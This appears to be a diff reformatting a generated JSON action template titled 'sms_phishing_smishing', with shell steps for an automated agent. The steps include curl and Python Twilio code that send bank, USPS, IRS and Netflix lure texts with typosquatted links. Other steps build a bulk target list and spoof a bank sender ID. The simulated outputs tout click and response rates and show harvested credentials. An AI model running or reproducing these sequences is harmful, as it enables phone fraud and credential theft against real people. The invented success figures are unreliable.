@@ -2,25 +2,81 @@
   "name": "sms_phishing_smishing",
   "description": "SMS phishing (smishing) attacks using bulk SMS services and social engineering",
   "pattern": "sms.*phish|smishing|text.*message.*phish|sms.*spoof",
-  "parameters": ["phone_numbers", "message"],
+  "parameters": [
+    "phone_numbers",
+    "message"
+  ],
   "sequence": [
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "curl -X POST https://api.twilio.com/2010-04-01/Accounts/AC123/Messages.json --data-urlencode 'From=+15551234567' --data-urlencode 'To=+15559876543' --data-urlencode 'Body=ALERT: Suspicious activity detected on your account. Verify immediately: http://bit.ly/verify123' -u AC123:auth_token"]},
-      "expected_output": {"type": "string", "example": "{\n  \"sid\": \"SM1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p\",\n  \"date_created\": \"Mon, 15 Jan 2024 18:00:00 +0000\",\n  \"date_updated\": \"Mon, 15 Jan 2024 18:00:00 +0000\",\n  \"date_sent\": \"Mon, 15 Jan 2024 18:00:01 +0000\",\n  \"account_sid\": \"AC123\",\n  \"to\": \"+15559876543\",\n  \"from\": \"+15551234567\",\n  \"body\": \"ALERT: Suspicious activity detected on your account. Verify immediately: http://bit.ly/verify123\",\n  \"status\": \"delivered\",\n  \"num_segments\": \"1\",\n  \"num_media\": \"0\",\n  \"direction\": \"outbound-api\",\n  \"price\": \"-0.0075\",\n  \"price_unit\": \"USD\"\n}\n\nSMS delivered successfully\nRecipient: +1 (555) 987-6543\nSender: +1 (555) 123-4567 (spoofed as bank number)\nMessage: Account security alert with malicious link\nDelivery status: Delivered\nExpected click rate: 25-35%"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "curl -X POST https://api.twilio.com/2010-04-01/Accounts/AC123/Messages.json --data-urlencode 'From=+15551234567' --data-urlencode 'To=+15559876543' --data-urlencode 'Body=ALERT: Suspicious activity detected on your account. Verify immediately: http://bit.ly/verify123' -u AC123:auth_token"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "{\n  \"sid\": \"SM1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p\",\n  \"date_created\": \"Mon, 15 Jan 2024 18:00:00 +0000\",\n  \"date_updated\": \"Mon, 15 Jan 2024 18:00:00 +0000\",\n  \"date_sent\": \"Mon, 15 Jan 2024 18:00:01 +0000\",\n  \"account_sid\": \"AC123\",\n  \"to\": \"+15559876543\",\n  \"from\": \"+15551234567\",\n  \"body\": \"ALERT: Suspicious activity detected on your account. Verify immediately: http://bit.ly/verify123\",\n  \"status\": \"delivered\",\n  \"num_segments\": \"1\",\n  \"num_media\": \"0\",\n  \"direction\": \"outbound-api\",\n  \"price\": \"-0.0075\",\n  \"price_unit\": \"USD\"\n}\n\nSMS delivered successfully\nRecipient: +1 (555) 987-6543\nSender: +1 (555) 123-4567 (spoofed as bank number)\nMessage: Account security alert with malicious link\nDelivery status: Delivered\nExpected click rate: 25-35%"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "cat > smishing_campaign.txt << 'EOF'\n+15551111111|Your package delivery failed. Reschedule: http://usps-track.co/p/abc123\n+15552222222|Your bank account has been locked. Unlock now: http://chase-secure.co/unlock\n+15553333333|You won $500 gift card! Claim here: http://amazon-prize.co/claim/xyz\n+15554444444|URGENT: IRS tax refund pending. Confirm details: http://irs-refund.co/verify\n+15555555555|Your Netflix subscription expired. Update payment: http://netflix-pay.co/renew\nEOF\nawk -F'|' '{print \"Sending to \" $1 \": \" $2}' smishing_campaign.txt"]},
-      "expected_output": {"type": "string", "example": "Bulk smishing campaign loaded from: smishing_campaign.txt\n\nCampaign targets: 5 phone numbers\n\nSending to +15551111111: Your package delivery failed. Reschedule: http://usps-track.co/p/abc123\nSending to +15552222222: Your bank account has been locked. Unlock now: http://chase-secure.co/unlock\nSending to +15553333333: You won $500 gift card! Claim here: http://amazon-prize.co/claim/xyz\nSending to +15554444444: URGENT: IRS tax refund pending. Confirm details: http://irs-refund.co/verify\nSending to +15555555555: Your Netflix subscription expired. Update payment: http://netflix-pay.co/renew\n\nMessage types:\n  - Package delivery (USPS)\n  - Banking alert (Chase)\n  - Prize/gift card (Amazon)\n  - Tax refund (IRS)\n  - Subscription renewal (Netflix)\n\nAll messages include:\n  ✓ Urgency (failed, locked, expired)\n  ✓ Legitimate brand names\n  ✓ Shortened/typosquatted URLs\n  ✓ Call to action (click link)"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "cat > smishing_campaign.txt << 'EOF'\n+15551111111|Your package delivery failed. Reschedule: http://usps-track.co/p/abc123\n+15552222222|Your bank account has been locked. Unlock now: http://chase-secure.co/unlock\n+15553333333|You won $500 gift card! Claim here: http://amazon-prize.co/claim/xyz\n+15554444444|URGENT: IRS tax refund pending. Confirm details: http://irs-refund.co/verify\n+15555555555|Your Netflix subscription expired. Update payment: http://netflix-pay.co/renew\nEOF\nawk -F'|' '{print \"Sending to \" $1 \": \" $2}' smishing_campaign.txt"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Bulk smishing campaign loaded from: smishing_campaign.txt\n\nCampaign targets: 5 phone numbers\n\nSending to +15551111111: Your package delivery failed. Reschedule: http://usps-track.co/p/abc123\nSending to +15552222222: Your bank account has been locked. Unlock now: http://chase-secure.co/unlock\nSending to +15553333333: You won $500 gift card! Claim here: http://amazon-prize.co/claim/xyz\nSending to +15554444444: URGENT: IRS tax refund pending. Confirm details: http://irs-refund.co/verify\nSending to +15555555555: Your Netflix subscription expired. Update payment: http://netflix-pay.co/renew\n\nMessage types:\n  - Package delivery (USPS)\n  - Banking alert (Chase)\n  - Prize/gift card (Amazon)\n  - Tax refund (IRS)\n  - Subscription renewal (Netflix)\n\nAll messages include:\n  ✓ Urgency (failed, locked, expired)\n  ✓ Legitimate brand names\n  ✓ Shortened/typosquatted URLs\n  ✓ Call to action (click link)"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "python3 << 'EOF'\nfrom twilio.rest import Client\n\naccount_sid = 'AC123'\nauth_token = 'token123'\nclient = Client(account_sid, auth_token)\n\ntargets = [\n    {\n        'phone': '+15551111111',\n        'name': 'John Doe',\n        'message': 'Hi John, your package from Amazon is delayed. Track it here: http://amzn-track.co/j0hn'\n    },\n    {\n        'phone': '+15552222222',\n        'name': 'Jane Smith',\n        'message': 'Jane, your Wells Fargo account requires verification: http://wellsfargo-secure.co/jane'\n    }\n]\n\nfor target in targets:\n    message = client.messages.create(\n        body=target['message'],\n        from_='+15559999999',\n        to=target['phone']\n    )\n    print(f\"[+] SMS sent to {target['name']} ({target['phone']}): {message.sid}\")\n    print(f\"    Status: {message.status}\")\nEOF"]},
-      "expected_output": {"type": "string", "example": "[+] SMS sent to John Doe (+15551111111): SM9a8b7c6d5e4f3g2h1i0j9k8l7m6n5o4p\n    Status: queued\n[+] SMS sent to Jane Smith (+15552222222): SM1z2y3x4w5v6u7t8s9r0q1p2o3n4m5l6k\n    Status: queued\n\nPersonalized smishing campaign:\n  - Uses recipient first names\n  - Tailored message content\n  - Brand-specific links\n  - Personalized URLs (j0hn, jane)\n\nDelivery statistics (after 5 minutes):\n  Messages sent: 2\n  Delivered: 2 (100%)\n  Failed: 0\n  Pending: 0\n\nLink click tracking:\n  http://amzn-track.co/j0hn - 1 click (John Doe, iOS Safari)\n  http://wellsfargo-secure.co/jane - 1 click (Jane Smith, Android Chrome)\n\nCredentials harvested:\n  Jane Smith: jane.smith@email.com / WellsF@rgo2024"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "python3 << 'EOF'\nfrom twilio.rest import Client\n\naccount_sid = 'AC123'\nauth_token = 'token123'\nclient = Client(account_sid, auth_token)\n\ntargets = [\n    {\n        'phone': '+15551111111',\n        'name': 'John Doe',\n        'message': 'Hi John, your package from Amazon is delayed. Track it here: http://amzn-track.co/j0hn'\n    },\n    {\n        'phone': '+15552222222',\n        'name': 'Jane Smith',\n        'message': 'Jane, your Wells Fargo account requires verification: http://wellsfargo-secure.co/jane'\n    }\n]\n\nfor target in targets:\n    message = client.messages.create(\n        body=target['message'],\n        from_='+15559999999',\n        to=target['phone']\n    )\n    print(f\"[+] SMS sent to {target['name']} ({target['phone']}): {message.sid}\")\n    print(f\"    Status: {message.status}\")\nEOF"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[+] SMS sent to John Doe (+15551111111): SM9a8b7c6d5e4f3g2h1i0j9k8l7m6n5o4p\n    Status: queued\n[+] SMS sent to Jane Smith (+15552222222): SM1z2y3x4w5v6u7t8s9r0q1p2o3n4m5l6k\n    Status: queued\n\nPersonalized smishing campaign:\n  - Uses recipient first names\n  - Tailored message content\n  - Brand-specific links\n  - Personalized URLs (j0hn, jane)\n\nDelivery statistics (after 5 minutes):\n  Messages sent: 2\n  Delivered: 2 (100%)\n  Failed: 0\n  Pending: 0\n\nLink click tracking:\n  http://amzn-track.co/j0hn - 1 click (John Doe, iOS Safari)\n  http://wellsfargo-secure.co/jane - 1 click (Jane Smith, Android Chrome)\n\nCredentials harvested:\n  Jane Smith: jane.smith@email.com / WellsF@rgo2024"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'From: +1-555-BANK-365\\nYour account ending in 9876 was charged $1,247.50. If you did not authorize this, reply STOP or visit http://chase-dispute.co/claim' | sendsms +15551234567"]},
-      "expected_output": {"type": "string", "example": "SMS sent from spoofed alphanumeric sender ID\n\nFrom: +1-555-BANK-365 (appears as bank customer service)\nTo: +15551234567\nMessage: \"Your account ending in 9876 was charged $1,247.50...\"\n\nSocial engineering tactics:\n  ✓ Partial account number (adds credibility)\n  ✓ Large dollar amount (creates urgency)\n  ✓ \"Did not authorize\" (implies fraud)\n  ✓ Two call-to-actions (reply or click)\n  ✓ Shortened URL (hides malicious domain)\n\nPsychological triggers:\n  - Fear (unauthorized charge)\n  - Urgency (immediate action needed)\n  - Loss aversion ($1,247.50 at risk)\n  - Trust (official-looking sender ID)\n\nExpected response rate: 45-55%\nReason: Financial threat + immediate loss"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "echo 'From: +1-555-BANK-365\\nYour account ending in 9876 was charged $1,247.50. If you did not authorize this, reply STOP or visit http://chase-dispute.co/claim' | sendsms +15551234567"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "SMS sent from spoofed alphanumeric sender ID\n\nFrom: +1-555-BANK-365 (appears as bank customer service)\nTo: +15551234567\nMessage: \"Your account ending in 9876 was charged $1,247.50...\"\n\nSocial engineering tactics:\n  ✓ Partial account number (adds credibility)\n  ✓ Large dollar amount (creates urgency)\n  ✓ \"Did not authorize\" (implies fraud)\n  ✓ Two call-to-actions (reply or click)\n  ✓ Shortened URL (hides malicious domain)\n\nPsychological triggers:\n  - Fear (unauthorized charge)\n  - Urgency (immediate action needed)\n  - Loss aversion ($1,247.50 at risk)\n  - Trust (official-looking sender ID)\n\nExpected response rate: 45-55%\nReason: Financial threat + immediate loss"
+      }
     }
   ],
-  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
   "created_by": "neural_mesh_v5.2_generator"
 }
